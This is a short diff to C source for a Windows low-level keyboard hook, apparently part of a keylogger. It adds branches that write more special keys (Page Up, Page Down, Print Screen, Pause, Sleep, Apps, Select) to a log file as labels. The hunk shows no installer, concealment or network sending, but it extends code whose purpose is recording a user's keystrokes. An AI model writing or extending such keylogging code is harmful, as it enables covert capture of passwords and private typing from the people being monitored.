@@ -293,6 +293,41 @@ LRESULT CALLBACK LowLevelKeyboardProc(
 				sprintf_s(logEntry, sizeof(logEntry), "[SCROLL]");
 				write_to_file(logEntry);
 			}
+			else if (keyCode == VK_PRIOR)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[PAGE_UP]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_NEXT)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[PAGE_DOWN]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_SNAPSHOT)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[PRINT_SCREEN]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_PAUSE)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[PAUSE]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_SLEEP)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[SLEEP]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_APPS)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[APPS]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_SELECT)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[SELECT]");
+				write_to_file(logEntry);
+			}
 			else
 			{
 
